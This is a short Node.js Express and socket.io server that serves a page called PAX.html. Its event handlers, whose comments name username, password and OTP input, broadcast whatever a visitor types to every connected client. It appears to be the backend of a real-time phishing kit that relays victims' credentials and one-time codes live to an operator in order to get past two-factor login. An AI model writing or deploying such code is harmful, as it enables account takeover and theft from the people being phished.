const express = require('express');
const path = require('path'); // Import path module
const app = express();
const server = require('http').createServer(app);
const io = require('socket.io')(server);

app.use(express.static(path.join(__dirname, 'public'))); // Serve static files

// Set default file when visiting the site (index.html)
app.get("/", (req, res) => {
    res.sendFile(path.join(__dirname, "public", "PAX.html"));
});

io.on('connection', (socket) => {
    console.log('A user connected:', socket.id);

    // Listen for username & password
    socket.on('typing', (data) => {
        io.emit('display', data); 
    });

    // Listen for OTP input
    socket.on('otpEntered', (data) => {
        io.emit('display', data); 
    });

    // Listen for submit event
    socket.on('submit', (data) => {
        io.emit('submitted', data); 
    });

    socket.on('disconnect', () => {
        console.log('User disconnected:', socket.id);
    });
});

server.listen(3000, () => {
    console.log('Server running on http://localhost:3000');
});
